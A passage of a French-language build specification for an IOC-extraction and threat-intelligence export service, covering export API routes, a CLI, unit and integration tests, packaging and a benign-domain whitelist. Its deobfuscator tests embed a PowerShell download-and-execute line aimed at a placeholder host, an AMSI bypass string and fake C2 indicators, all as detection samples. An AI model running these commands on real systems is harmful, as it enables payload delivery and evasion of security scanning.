  → 404 si job inconnu
  HTTP 204

GET /api/v1/jobs/{job_id}/result
  Query params : min_confidence (int=0), ioc_type (list[str]=None)
  → job = await queue.get_job()
  RUNNING  → HTTP 202 {"status": "running", "progress": N, "stage": "..."}
  FAILED   → HTTP 422 {"error": "JOB_FAILED", "message": job.error}
  CANCELLED → HTTP 410
  COMPLETED → bundle = await queue.get_result()
              Filtrer iocs selon min_confidence et ioc_type si fournis
              HTTP 200 bundle

──────────────────────────────────────────────────────────────────────────────
api/routers/export.py
──────────────────────────────────────────────────────────────────────────────

Pour chaque format, récupérer le bundle via queue.get_result() :
  Si job non COMPLETED → 404 ou 202 selon status

GET /api/v1/export/{job_id}/stix
  → exporter = STIXExporter()
  → result = exporter.export(bundle)
  → Response(content=result.content, media_type="application/stix+json",
             headers={"Content-Disposition": f"attachment; filename={result.filename}"})

GET /api/v1/export/{job_id}/openioc
  → media_type="application/xml"

GET /api/v1/export/{job_id}/misp
  → media_type="application/json"

GET /api/v1/export/{job_id}/cytomic
  → media_type="text/csv"

GET /api/v1/export/{job_id}/all
  Créer archive ZIP en mémoire :
  import zipfile, io
  zip_buffer = io.BytesIO()
  with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
      for fmt, exporter in exporters.items():
          result = exporter.export(bundle)
          zf.writestr(result.filename, result.content)
  → Response(content=zip_buffer.getvalue(), media_type="application/zip",
             headers={"Content-Disposition": f"attachment; filename=admap_m1_{job_id}.zip"})

POST /api/v1/export/{job_id}/push/misp
  Body : {"misp_url": "...", "misp_key": "..."}
  → MISPExporter().push_to_misp(bundle, misp_url, misp_key)
  HTTP 200 {"status": "pushed", "event_id": "..."}
  HTTP 502 si connexion MISP échoue (capturer httpx.ConnectError + ADMAPM1Error)

════════════════════════════════════════════════════════════════════════════════
SECTION 14 — CLI CLICK (cli/main.py) — ZÉRO INTERACTIVITÉ
════════════════════════════════════════════════════════════════════════════════

RAPPEL ABSOLU : Aucun input(), aucun menu, aucune bannière cosmétique.
Toute sortie informative va sur stderr via click.echo(err=True).
La sortie machine-readable (JSON résumé) va sur stdout.
Code de sortie : 0 = succès, 1 = erreur.

import click, json, sys, asyncio
from pathlib import Path

@click.group()
@click.version_option(version="3.0.0", prog_name="admap-m1")
def cli():
    """ADMAP M1 — IOC Extractor v3.0 | Programmatic cybersecurity IOC engine"""
    pass

@cli.command()
@click.argument("file_path", type=click.Path(exists=True, readable=True,
                                              path_type=Path))
@click.option("--format", "-f", "export_formats", multiple=True,
    type=click.Choice(["stix", "openioc", "misp", "cytomic"]),
    help="Export format(s). Repeatable: -f stix -f misp")
@click.option("--vt-key", envvar="ADMAP_M1_VT_API_KEY", default="",
    help="VirusTotal API key")
@click.option("--vt-limit", default=5, type=int, show_default=True,
    help="Max IOCs to check per type in VT")
@click.option("--no-deobfuscation", is_flag=True, default=False,
    help="Disable deobfuscation stage")
@click.option("--min-confidence", default=20, type=click.IntRange(0, 100),
    show_default=True, help="Minimum confidence threshold (0-100)")
@click.option("--output-dir", type=click.Path(path_type=Path), default=Path("."),
    show_default=True, help="Directory for export files")
@click.option("--output-json", type=click.Path(path_type=Path), default=None,
    help="Save full IOCBundle JSON to this file")
@click.option("--quiet", "-q", is_flag=True, default=False,
    help="Suppress progress output (errors still shown)")
def analyze(file_path, export_formats, vt_key, vt_limit, no_deobfuscation,
            min_confidence, output_dir, output_json, quiet):
    """
    Analyze FILE_PATH and extract IOCs.

    Examples:
      admap-m1 analyze malware.exe -f stix -f misp --output-dir ./results
      admap-m1 analyze report.txt --vt-key $VT_KEY --min-confidence 40
      admap-m1 analyze archive.zip --no-deobfuscation --output-json bundle.json
    """
    options = AnalysisOptions(
        enable_vt_enrichment=bool(vt_key),
        vt_api_key=vt_key or None,
        vt_max_per_type=vt_limit,
        enable_deobfuscation=not no_deobfuscation,
        export_formats=list(export_formats),
        min_confidence_threshold=min_confidence,
    )

    settings = get_settings()
    pipeline = _build_pipeline(settings)

    def on_progress(pct: int, stage: str) -> None:
        if not quiet:
            click.echo(f"[{pct:3d}%] {stage}", err=True)

    try:
        bundle = asyncio.run(
            pipeline.run(
                file_bytes=file_path.read_bytes(),
                file_path=file_path,
                options=options,
                on_progress=on_progress,
            )
        )
    except ADMAPM1Error as e:
        click.echo(f"ERROR [{e.code}]: {e.message}", err=True)
        sys.exit(1)
    except Exception as e:
        click.echo(f"UNEXPECTED ERROR: {e}", err=True)
        sys.exit(1)

    # Sauvegarder bundle JSON
    if output_json:
        output_json.write_text(bundle.model_dump_json(indent=2), encoding="utf-8")
        if not quiet:
            click.echo(f"Bundle JSON saved: {output_json}", err=True)

    # Générer les exports
    output_dir.mkdir(parents=True, exist_ok=True)
    exporters_map = {
        "stix":    STIXExporter(),
        "openioc": OpenIOCExporter(),
        "misp":    MISPExporter(),
        "cytomic": CytomicExporter(),
    }
    for fmt in export_formats:
        exporter = exporters_map.get(fmt)
        if not exporter:
            continue
        result = exporter.export(bundle)
        out_file = output_dir / result.filename
        out_file.write_text(result.content, encoding="utf-8")
        if not quiet:
            click.echo(f"Export {fmt.upper()} → {out_file}", err=True)

    # Sortie JSON machine-readable sur stdout
    summary = {
        "bundle_id":        str(bundle.bundle_id),
        "filename":         bundle.metadata.filename,
        "filetype":         bundle.metadata.filetype,
        "total_iocs":       bundle.analysis_stats.total_iocs,
        "by_type":          bundle.analysis_stats.by_type,
        "filtered_out":     bundle.analysis_stats.filtered_out,
        "deobfuscation_layers": bundle.analysis_stats.deobfuscation_layers,
        "is_packed":        bundle.metadata.is_packed,
        "packer_name":      bundle.metadata.packer_name,
        "duration_ms":      bundle.analysis_stats.duration_ms,
    }
    click.echo(json.dumps(summary, indent=2))
    sys.exit(0)


@cli.command()
@click.argument("bundle_json", type=click.Path(exists=True, path_type=Path))
@click.option("--format", "-f", "fmt", required=True,
    type=click.Choice(["stix", "openioc", "misp", "cytomic", "all"]))
@click.option("--output", "-o", type=click.Path(path_type=Path), default=None)
@click.option("--misp-url", default=None, help="MISP instance URL")
@click.option("--misp-key", default=None, envvar="ADMAP_M1_MISP_KEY",
    help="MISP API key")
def export(bundle_json, fmt, output, misp_url, misp_key):
    """Export an existing IOCBundle JSON to a specific format."""
    try:
        bundle = IOCBundle.model_validate_json(bundle_json.read_text())
    except Exception as e:
        click.echo(f"ERROR: Cannot parse bundle: {e}", err=True)
        sys.exit(1)

    exporters_map = {
        "stix": STIXExporter(), "openioc": OpenIOCExporter(),
        "misp": MISPExporter(), "cytomic": CytomicExporter(),
    }

    if fmt == "all":
        out_dir = Path(output) if output else Path(".")
        out_dir.mkdir(parents=True, exist_ok=True)
        for f, exporter in exporters_map.items():
            result = exporter.export(bundle)
            out_file = out_dir / result.filename
            out_file.write_text(result.content, encoding="utf-8")
            click.echo(str(out_file))
        sys.exit(0)

    if fmt == "misp" and misp_url and misp_key:
        try:
            result = MISPExporter().push_to_misp(bundle, misp_url, misp_key)
            click.echo(json.dumps(result, indent=2))
        except ADMAPM1Error as e:
            click.echo(f"ERROR [{e.code}]: {e.message}", err=True)
            sys.exit(1)
        sys.exit(0)

    exporter = exporters_map.get(fmt)
    result = exporter.export(bundle)
    out_path = Path(output) if output else Path(result.filename)
    out_path.write_text(result.content, encoding="utf-8")
    click.echo(str(out_path))
    sys.exit(0)


@cli.command()
@click.option("--host", default="0.0.0.0", show_default=True)
@click.option("--port", default=8000, type=int, show_default=True)
@click.option("--reload", is_flag=True, default=False,
    help="Enable auto-reload (development only)")
@click.option("--workers", default=1, type=int, show_default=True)
def serve(host, port, reload, workers):
    """Start the ADMAP M1 FastAPI server."""
    import uvicorn
    uvicorn.run(
        "admap_m1.api.main:app",
        host=host, port=port,
        reload=reload, workers=workers,
    )

════════════════════════════════════════════════════════════════════════════════
SECTION 15 — TESTS (tests/)
════════════════════════════════════════════════════════════════════════════════

──────────────────────────────────────────────────────────────────────────────
tests/conftest.py — Fixtures réutilisables
──────────────────────────────────────────────────────────────────────────────

import pytest
import pytest_asyncio
from httpx import AsyncClient, ASGITransport

@pytest.fixture
def minimal_pe_bytes() -> bytes:
    """
    Construire un PE valide minimal en bytes (MZ header + PE header minimal).
    Ne pas dépendre de fichiers externes.
    Utiliser les headers PE standards de base.
    """

@pytest.fixture
def sample_ioc_text() -> bytes:
    return b"""
    Malware analysis report - CONFIDENTIAL
    C2 server: 185.234.100.123
    Secondary C2: 45.77.65.211:4444
    Domain: evil-c2.ru
    Backup domain: payload-host.xyz
    SHA256: 275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f
    MD5: d41d8cd98f00b204e9800998ecf8427e
    Registry: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater
    Mutex: Global\\MalwareMutex_2024
    Encoded: cG93ZXJzaGVsbCAtZW5jb2RlZCBJQUJnAG==
    URL: https://evil-c2.ru/payload/dropper.exe
    Defanged URL: hxxps[://]backup.xyz/stage2[.]bin
    """

@pytest.fixture
def mock_vt_response() -> dict:
    return {
        "data": {
            "attributes": {
                "last_analysis_stats": {
                    "malicious": 45, "suspicious": 3,
                    "undetected": 15, "harmless": 0
                },
                "type_description": "Win32 EXE",
                "meaningful_name": "malware.exe",
                "reputation": -100,
            }
        }
    }

@pytest_asyncio.fixture
async def async_client():
    from admap_m1.api.main import create_app
    app = create_app()
    async with AsyncClient(
        transport=ASGITransport(app=app), base_url="http://test"
    ) as client:
        yield client

@pytest.fixture
def test_pipeline() -> AnalysisPipeline:
    """Pipeline de test sans VT, sans dépendances optionnelles."""
    from admap_m1.api.main import _build_pipeline
    return _build_pipeline(Settings())

──────────────────────────────────────────────────────────────────────────────
tests/unit/test_models.py
──────────────────────────────────────────────────────────────────────────────

def test_ioc_score_upper_bound_validation():
    with pytest.raises(ValidationError):
        IOC(type=IOCType.IPV4, value="1.2.3.4",
            value_defanged="1[.]2[.]3[.]4", confidence_score=101,
            confidence_level=IOCConfidenceLevel.CONFIRMED,
            context_snippet="", extraction_method="test",
            first_seen=datetime.utcnow())

def test_ioc_score_lower_bound_validation():
    with pytest.raises(ValidationError):
        IOC(...confidence_score=-1...)

def test_ioc_is_frozen():
    ioc = IOC(...)
    with pytest.raises(Exception):  # Pydantic frozen
        ioc.value = "other"

def test_analysis_options_defaults():
    opts = AnalysisOptions()
    assert opts.enable_vt_enrichment == False
    assert opts.min_confidence_threshold == 20

def test_ioc_bundle_empty_iocs():
    bundle = IOCBundle(metadata=..., iocs=[])
    assert bundle.analysis_stats.total_iocs == 0

def test_confidence_level_enum_values():
    assert IOCConfidenceLevel.CONFIRMED == "confirmed"

──────────────────────────────────────────────────────────────────────────────
tests/unit/test_filters.py
──────────────────────────────────────────────────────────────────────────────

def test_rfc1918_detected():
    f = WhitelistFilter()
    assert f.is_rfc1918("10.0.0.1")
    assert f.is_rfc1918("192.168.1.100")
    assert f.is_rfc1918("172.16.50.1")
    assert f.is_rfc1918("127.0.0.1")

def test_rfc1918_not_detected():
    f = WhitelistFilter()
    assert not f.is_rfc1918("8.8.8.8")
    assert not f.is_rfc1918("185.234.100.123")

def test_invalid_ip_does_not_crash():
    f = WhitelistFilter()
    assert not f.is_rfc1918("not_an_ip")

def test_benign_domain_filtered():
    f = WhitelistFilter()
    assert f.is_benign_domain("microsoft.com")
    assert f.is_benign_domain("api.github.com")

def test_defang_ip():
    d = IOCDefanger()
    assert d.defang("1.2.3.4", IOCType.IPV4) == "1[.]2[.]3[.]4"

def test_defang_url():
    d = IOCDefanger()
    assert d.defang("https://evil.com/path", IOCType.URL) == "hxxps[://]evil[.]com/path"

def test_refang_url():
    d = IOCDefanger()
    assert d.refang("hxxps[://]evil[.]com/path") == "https://evil.com/path"

def test_defang_email():
    d = IOCDefanger()
    assert d.defang("user@evil.com", IOCType.EMAIL) == "user[@]evil[.]com"

def test_contains_defanged():
    d = IOCDefanger()
    assert d.contains_defanged("hxxps[://]example[.]com")
    assert not d.contains_defanged("https://example.com")

def test_deduplication_case_insensitive():
    dedup = IOCDeduplicator()
    iocs = [
        RawIOC(type=IOCType.DOMAIN, value="Evil-C2.RU", extraction_method="test"),
        RawIOC(type=IOCType.DOMAIN, value="evil-c2.ru", extraction_method="test"),
    ]
    result = dedup.deduplicate(iocs)
    assert len(result) == 1

def test_deduplication_keeps_richer_context():
    dedup = IOCDeduplicator()
    iocs = [
        RawIOC(type=IOCType.IPV4, value="1.2.3.4",
               context_snippet="short", extraction_method="test"),
        RawIOC(type=IOCType.IPV4, value="1.2.3.4",
               context_snippet="much longer context with more info",
               extraction_method="test"),
    ]
    result = dedup.deduplicate(iocs)
    assert len(result) == 1
    assert result[0].context_snippet == "much longer context with more info"

──────────────────────────────────────────────────────────────────────────────
tests/unit/test_regex_extractor.py
──────────────────────────────────────────────────────────────────────────────

SAMPLE = b"""
C2: 185.234.100.123 and 2001:db8::1
Domain: evil-c2.ru and payload.xyz
Hash: d41d8cd98f00b204e9800998ecf8427e
SHA256: 275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f
URL: https://evil.com/dropper.exe
Registry: HKCU\\Software\\malware\\persist
Mutex: Global\\EvilMutex2024Lock
"""

def test_ipv4_extraction(sample_ioc_text):
    ext = RegexExtractor()
    iocs = ext.extract(sample_ioc_text, Path("test.txt"), dummy_metadata())
    ips = [i for i in iocs if i.type == IOCType.IPV4]
    assert any("185.234.100.123" in i.value for i in ips)

def test_domain_extraction():
    iocs = RegexExtractor().extract(SAMPLE, Path("test.txt"), dummy_metadata())
    domains = [i.value for i in iocs if i.type == IOCType.DOMAIN]
    assert "evil-c2.ru" in domains

def test_md5_extraction():
    iocs = RegexExtractor().extract(SAMPLE, Path("test.txt"), dummy_metadata())
    hashes = [i.value for i in iocs if i.type == IOCType.HASH_MD5]
    assert "d41d8cd98f00b204e9800998ecf8427e" in hashes

def test_sha256_extraction():
    iocs = RegexExtractor().extract(SAMPLE, Path("test.txt"), dummy_metadata())
    hashes = [i.value for i in iocs if i.type == IOCType.HASH_SHA256]
    assert "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f" in hashes

def test_registry_extraction():
    iocs = RegexExtractor().extract(SAMPLE, Path("test.txt"), dummy_metadata())
    regs = [i.value for i in iocs if i.type == IOCType.REGISTRY_KEY]
    assert len(regs) > 0

def test_defanged_url_refanged_before_extraction():
    text = b"hxxps[://]evil[.]com/payload"
    iocs = RegexExtractor().extract(text, Path("test.txt"), dummy_metadata())
    urls = [i.value for i in iocs if i.type == IOCType.URL]
    assert any("evil.com" in u for u in urls)

def test_context_snippet_populated():
    iocs = RegexExtractor().extract(SAMPLE, Path("test.txt"), dummy_metadata())
    assert all(len(i.context_snippet) >= 0 for i in iocs)

──────────────────────────────────────────────────────────────────────────────
tests/unit/test_pe_extractor.py
──────────────────────────────────────────────────────────────────────────────

def test_can_handle_pe_magic(minimal_pe_bytes):
    parser = PEParser()
    assert parser.can_handle(minimal_pe_bytes, Path("test.exe"))

def test_cannot_handle_non_pe():
    parser = PEParser()
    assert not parser.can_handle(b"Not a PE file at all", Path("test.txt"))

def test_malformed_pe_does_not_raise():
    parser = PEParser()
    malformed = b"MZ" + bytes(500)
    # Ne doit pas lever d'exception non catchée
    try:
        parser.parse_metadata(malformed, Path("test.exe"))
    except PEParsingError:
        pass  # Attendu si PE invalide
    except Exception as e:
        pytest.fail(f"Unexpected exception: {e}")

def test_suspicious_import_scoring():
    parser = PEParser()
    imports = {
        "kernel32.dll": ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"]
    }
    score = parser._score_import_suspicion(imports)
    assert score >= 50

def test_no_suspicious_imports_zero_score():
    parser = PEParser()
    imports = {"kernel32.dll": ["GetTickCount", "ExitProcess"]}
    score = parser._score_import_suspicion(imports)
    assert score < 20

──────────────────────────────────────────────────────────────────────────────
tests/unit/test_deobfuscators.py
──────────────────────────────────────────────────────────────────────────────

def test_xor_single_byte_roundtrip():
    payload = b"https://evil.com/payload.exe command shell"
    key = 0x41
    encoded = bytes(b ^ key for b in payload)
    decoder = XORDecoder()
    assert decoder.detect(encoded)
    decoded, result = decoder.decode(encoded)
    assert b"evil.com" in decoded
    assert result.key_used == "0x41"

def test_xor_no_false_positive_on_plaintext():
    text = b"This is a perfectly normal string with no XOR encoding"
    decoder = XORDecoder()
    assert not decoder.detect(text)

def test_base64_single_layer_detection():
    import base64
    original = b"https://evil.com/c2"
    encoded = base64.b64encode(original).decode()
    decoder = Base64Decoder()
    assert decoder.detect(encoded)
    decoded, result = decoder.decode(encoded)
    assert b"evil.com" in (decoded if isinstance(decoded, bytes) else decoded.encode())

def test_base64_powershell_encoded_command():
    import base64
    ps_code = "Write-Host 'Hello'; IEX (New-Object Net.WebClient).DownloadString('https://evil.com')"
    encoded = base64.b64encode(ps_code.encode('utf-16-le')).decode()
    cmd = f"powershell.exe -EncodedCommand {encoded}"
    decoder = Base64Decoder()
    assert decoder.detect(cmd)
    decoded, result = decoder.decode(cmd)
    assert "evil.com" in (decoded if isinstance(decoded, str) else decoded.decode())

def test_rot13_detection_and_decode():
    import codecs
    original = "connect to http://evil.com for payload"
    encoded = codecs.encode(original, 'rot_13')
    decoder = RotDecoder()
    assert decoder.detect(encoded)
    decoded, result = decoder.decode(encoded)
    assert "evil.com" in decoded

def test_powershell_amsi_bypass_detection():
    code = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
    decoder = PowerShellDecoder()
    assert decoder.detect(code)

──────────────────────────────────────────────────────────────────────────────
tests/unit/test_ioc_scorer.py
──────────────────────────────────────────────────────────────────────────────

def test_rfc1918_ip_gets_malus():
    raw = RawIOC(type=IOCType.IPV4, value="192.168.1.1", extraction_method="test")
    scorer = IOCScorer()
    score, reasons = scorer.score(raw, ExtractionContext())
    assert score <= 20
    assert any("RFC1918" in r for r in reasons)

def test_decoded_layer_gets_bonus():
    raw = RawIOC(type=IOCType.IPV4, value="185.234.100.123",
                 extraction_method="test", in_decoded_layer=True)
    scorer = IOCScorer()
    score, reasons = scorer.score(raw, ExtractionContext())
    assert score >= 50
    assert any("decoded" in r.lower() for r in reasons)

def test_benign_domain_gets_heavy_malus():
    raw = RawIOC(type=IOCType.DOMAIN, value="microsoft.com", extraction_method="test")
    scorer = IOCScorer()
    score, _ = scorer.score(raw, ExtractionContext())
    assert score <= 10

def test_score_clamped_to_100():
    raw = RawIOC(type=IOCType.DOMAIN, value="evil.xyz",
                 extraction_method="vba_macro",
                 in_decoded_layer=True,
                 section_name=".text")
    ctx = ExtractionContext(
        vba_autoexec_detected=True,
        import_suspicion_score=80,
    )
    scorer = IOCScorer()
    score, _ = scorer.score(raw, ctx)
    assert score <= 100

def test_score_clamped_to_0():
    raw = RawIOC(type=IOCType.IPV4, value="127.0.0.1", extraction_method="test")
    scorer = IOCScorer()
    score, _ = scorer.score(raw, ExtractionContext())
    assert score >= 0

def test_confidence_level_mapping():
    scorer = IOCScorer()
    assert scorer.to_confidence_level(90) == IOCConfidenceLevel.CONFIRMED
    assert scorer.to_confidence_level(70) == IOCConfidenceLevel.HIGH
    assert scorer.to_confidence_level(50) == IOCConfidenceLevel.MEDIUM
    assert scorer.to_confidence_level(30) == IOCConfidenceLevel.LOW
    assert scorer.to_confidence_level(10) == IOCConfidenceLevel.NOISE

def test_scoring_reasons_populated():
    raw = RawIOC(type=IOCType.IPV4, value="10.0.0.1", extraction_method="test")
    scorer = IOCScorer()
    _, reasons = scorer.score(raw, ExtractionContext())
    assert len(reasons) > 0

──────────────────────────────────────────────────────────────────────────────
tests/unit/test_exporters.py
──────────────────────────────────────────────────────────────────────────────

def test_stix_export_valid_json(sample_bundle):
    exporter = STIXExporter()
    result = exporter.export(sample_bundle)
    assert result.content_type == "application/stix+json"
    data = json.loads(result.content)
    assert data.get("type") == "bundle"
    assert len(data.get("objects", [])) > 0

def test_openioc_export_valid_xml(sample_bundle):
    exporter = OpenIOCExporter()
    result = exporter.export(sample_bundle)
    assert result.content_type == "application/xml"
    from xml.etree import ElementTree as ET
    root = ET.fromstring(result.content)
    assert root is not None

def test_cytomic_export_valid_csv(sample_bundle):
    exporter = CytomicExporter()
    result = exporter.export(sample_bundle)
    assert result.content_type == "text/csv"
    import csv, io
    reader = csv.DictReader(io.StringIO(result.content))
    rows = list(reader)
    assert len(rows) > 0
    assert "type" in rows[0]
    assert "severity" in rows[0]

def test_misp_export_valid_json(sample_bundle):
    exporter = MISPExporter()
    result = exporter.export(sample_bundle)
    data = json.loads(result.content)
    assert "Event" in data
    assert len(data["Event"].get("Attribute", [])) > 0

──────────────────────────────────────────────────────────────────────────────
tests/integration/test_pipeline.py
──────────────────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_full_pipeline_text_input(test_pipeline, sample_ioc_text):
    bundle = await test_pipeline.run(
        file_bytes=sample_ioc_text,
        file_path=Path("test_report.txt"),
        options=AnalysisOptions(
            enable_vt_enrichment=False,
            enable_deobfuscation=True,
            min_confidence_threshold=10,
        ),
        on_progress=None,
    )
    assert isinstance(bundle, IOCBundle)
    assert bundle.analysis_stats.total_iocs > 0
    ioc_values = [ioc.value for ioc in bundle.iocs]
    assert "185.234.100.123" in ioc_values
    assert "evil-c2.ru" in ioc_values

@pytest.mark.asyncio
async def test_pipeline_stats_populated(test_pipeline, sample_ioc_text):
    bundle = await test_pipeline.run(
        file_bytes=sample_ioc_text,
        file_path=Path("test.txt"),
        options=AnalysisOptions(enable_vt_enrichment=False),
    )
    assert bundle.analysis_stats.duration_ms > 0
    assert len(bundle.analysis_stats.by_type) > 0

@pytest.mark.asyncio
async def test_api_health(async_client):
    response = await async_client.get("/health")
    assert response.status_code == 200
    assert response.json()["status"] == "ok"

@pytest.mark.asyncio
async def test_api_analyze_text(async_client):
    response = await async_client.post(
        "/api/v1/analyze/text",
        json={
            "text": "C2: 185.234.100.123 evil-c2.ru d41d8cd98f00b204e9800998ecf8427e",
            "options": {"min_confidence_threshold": 0}
        }
    )
    assert response.status_code == 200
    data = response.json()
    assert "iocs" in data
    assert "analysis_stats" in data

@pytest.mark.asyncio
async def test_api_formats_endpoint(async_client):
    response = await async_client.get("/api/v1/analyze/formats")
    assert response.status_code == 200
    data = response.json()
    assert "ioc_types" in data
    assert "export_formats" in data
    assert "capabilities" in data

════════════════════════════════════════════════════════════════════════════════
SECTION 16 — CONFIGURATION DU PROJET
════════════════════════════════════════════════════════════════════════════════

──────────────────────────────────────────────────────────────────────────────
pyproject.toml
──────────────────────────────────────────────────────────────────────────────

[build-system]
requires = ["setuptools>=68", "wheel"]
build-backend = "setuptools.backends.legacy:build"

[project]
name = "admap-m1"
version = "3.0.0"
description = "ADMAP M1 — IOC Extractor microservice (Static analysis only)"
requires-python = ">=3.11"
dependencies = [
    "fastapi>=0.111.0",
    "uvicorn[standard]>=0.29.0",
    "pydantic>=2.7.0",
    "pydantic-settings>=2.3.0",
    "httpx>=0.27.0",
    "python-multipart>=0.0.9",
    "structlog>=24.1.0",
    "pefile>=2023.2.7",
    "ppdeep>=20200505",
    "stix2>=3.0.1",
    "tenacity>=8.3.0",
    "click>=8.1.7",
    "python-magic-bin>=0.4.14; sys_platform == 'win32'",
    "python-magic>=0.4.27; sys_platform != 'win32'",
]

[project.optional-dependencies]
full = [
    "oletools>=0.60.1",
    "py7zr>=0.21.0",
    "pyelftools>=0.31",
    "pymisp>=2.4.170",
]
dev = [
    "pytest>=8.2.0",
    "pytest-asyncio>=0.23.0",
    "pytest-cov>=5.0.0",
    "ruff>=0.4.0",
    "mypy>=1.10.0",
    "httpx>=0.27.0",
]

[project.scripts]
admap-m1 = "admap_m1.cli.main:cli"

[tool.pytest.ini_options]
asyncio_mode = "auto"
testpaths = ["tests"]
addopts = "--tb=short -q --cov=admap_m1 --cov-report=term-missing"

[tool.ruff]
line-length = 88
target-version = "py311"
select = ["E", "F", "I", "B", "UP"]

[tool.mypy]
python_version = "3.11"
strict = true
ignore_missing_imports = true

──────────────────────────────────────────────────────────────────────────────
.env.example
──────────────────────────────────────────────────────────────────────────────

# ADMAP M1 — Configuration (copy to .env and adapt)
ADMAP_M1_API_HOST=0.0.0.0
ADMAP_M1_API_PORT=8000
ADMAP_M1_DEBUG=false
ADMAP_M1_LOG_LEVEL=INFO
ADMAP_M1_LOG_FORMAT=json
ADMAP_M1_MAX_UPLOAD_SIZE_MB=100
ADMAP_M1_TEMP_DIR=/tmp/admap_m1
ADMAP_M1_VT_API_KEY=
ADMAP_M1_VT_IS_PREMIUM=false
ADMAP_M1_VT_MAX_PER_TYPE=5
ADMAP_M1_MIN_CONFIDENCE_THRESHOLD=20
ADMAP_M1_MAX_RECURSION_DEPTH=3
ADMAP_M1_JOB_TTL_HOURS=24

════════════════════════════════════════════════════════════════════════════════
SECTION 17 — ORDRE D'EXÉCUTION ET RÈGLES DE LIVRAISON
════════════════════════════════════════════════════════════════════════════════

ORDRE IMPÉRATIF DE GÉNÉRATION :

1.  pyproject.toml + .env.example
2.  admap_m1/__init__.py  (version = "3.0.0", __all__)
3.  core/exceptions.py
4.  core/config.py
5.  core/logging.py
6.  models/ioc.py           (tous les modèles Pydantic)
7.  models/job.py
8.  heuristics/entropy.py   (pas de dépendances)
9.  filters/defanger.py
10. filters/whitelist.py    (porte TOUT depuis extracteur.py)
11. filters/deduplicator.py
12. parsers/base.py
13. parsers/pe_parser.py
14. parsers/elf_parser.py
15. parsers/office_parser.py
16. parsers/archive_parser.py
17. extractors/base.py
18. extractors/string_extractor.py
19. extractors/regex_extractor.py  (porte TOUS les patterns)
20. extractors/pe_extractor.py
21. extractors/elf_extractor.py
22. extractors/vba_extractor.py
23. deobfuscators/base.py
24. deobfuscators/base64_decoder.py
25. deobfuscators/xor_decoder.py
26. deobfuscators/rot_decoder.py
27. deobfuscators/powershell_decoder.py
28. deobfuscators/packer_detector.py
29. heuristics/context_analyzer.py
30. heuristics/ioc_scorer.py
31. enrichers/base.py
32. enrichers/virustotal.py
33. exporters/base.py
34. exporters/stix_exporter.py
35. exporters/openioc_exporter.py
36. exporters/misp_exporter.py
37. exporters/cytomic_exporter.py
38. pipeline/orchestrator.py
39. pipeline/job_queue.py
40. api/dependencies.py
41. api/routers/analyze.py
42. api/routers/jobs.py
43. api/routers/export.py
44. api/main.py
45. cli/main.py
46. tests/conftest.py
47. tests/unit/test_models.py
48. tests/unit/test_filters.py
49. tests/unit/test_regex_extractor.py
50. tests/unit/test_pe_extractor.py
51. tests/unit/test_deobfuscators.py
52. tests/unit/test_ioc_scorer.py
53. tests/unit/test_exporters.py
54. tests/integration/test_pipeline.py
55. README.md

RÈGLES DE LIVRAISON — VIOLATIONS = REFUS :

R0 — ZÉRO input() : aucun appel dans aucun fichier.
R1 — ZÉRO menu interactif : aucun while True attendant une saisie.
R2 — ZÉRO print() : seul click.echo(err=True) dans cli/main.py est autorisé.
     Partout ailleurs : structlog get_logger().
R3 — ZÉRO placeholder : aucun pass nu, aucun NotImplementedError sans
     message détaillé et justification.
R4 — TYPAGE COMPLET : chaque paramètre, chaque retour, chaque ClassVar.
R5 — DOCSTRINGS : chaque méthode publique a une docstring Google Style.
R6 — IMPORTS OPTIONNELS : oletools, pyelftools, py7zr, pymisp, ppdeep
     encapsulés dans try/except ImportError avec flag *_AVAILABLE.
R7 — SÉCURITÉ : aucun subprocess sur les samples. Aucun eval(). Aucun exec().
R8 — EN-TÊTES : chaque fichier Python commence par le bloc Module/Version/Dépend.
R9 — TESTS AUTONOMES : tous les tests unitaires passent sans oletools, pyelftools,
     py7zr, pymisp (utiliser pytest.importorskip() pour les tests qui en ont besoin).
R10 — PÉRIMÈTRE : aucune règle YARA, aucune analyse PCAP, aucun ML/NER.
      Toute violation de périmètre est un bug critique.

════════════════════════════════════════════════════════════════════════════════
SECTION 18 — SPÉCIFICATIONS DÉTAILLÉES DES DONNÉES DE RÉFÉRENCE
════════════════════════════════════════════════════════════════════════════════

Cette section documente les données de référence critiques qui DOIVENT être
portées intégralement depuis le code existant. Ne pas tronquer ces listes.

──────────────────────────────────────────────────────────────────────────────
18.1 — VALID_TLDS : Liste complète des TLDs valides (à porter depuis extracteur.py)
──────────────────────────────────────────────────────────────────────────────

La liste VALID_TLDS dans WhitelistFilter doit contenir l'ensemble complet
des TLDs reconnus par l'IANA. Porter EXACTEMENT depuis extracteur.py.
Les TLDs manquants génèrent des faux positifs massifs sur les domaines légitimes.

Structure attendue dans whitelist.py :
VALID_TLDS: ClassVar[set[str]] = {
    # Generic TLDs
    "com", "org", "net", "edu", "gov", "mil", "int",
    # Country codes (liste complète IANA : .ac, .ad, .ae, .af, .ag, ...)
    # New gTLDs (liste complète : .academy, .accountant, .accountants, ...)
    # Sponsored TLDs : .aero, .asia, .coop, .jobs, .mobi, .museum, .post, .tel, .travel
    # Infrastructure : .arpa
    # TOUT depuis extracteur.py — aucune entrée supprimée
}

──────────────────────────────────────────────────────────────────────────────
18.2 — BENIGN_DOMAINS : Domaines bénins (à porter depuis extracteur.py)
──────────────────────────────────────────────────────────────────────────────

BENIGN_DOMAINS: ClassVar[set[str]] = {
    # Microsoft
    "microsoft.com", "windows.com", "windowsupdate.com", "microsoftonline.com",
    "office.com", "office365.com", "live.com", "hotmail.com", "outlook.com",
    "azure.com", "azureedge.net", "msn.com", "bing.com", "xbox.com",
    "visualstudio.com", "github.com", "githubusercontent.com", "nuget.org",
    # Google
    "google.com", "googleapis.com", "googleusercontent.com", "gstatic.com",
    "googlesyndication.com", "googletagmanager.com", "googleadservices.com",
    "youtube.com", "ytimg.com", "googlevideo.com", "gmail.com",
    "android.com", "chromium.org", "goo.gl",
    # Amazon / AWS
    "amazon.com", "amazonaws.com", "awsstatic.com", "cloudfront.net",
    "amazonwebservices.com",
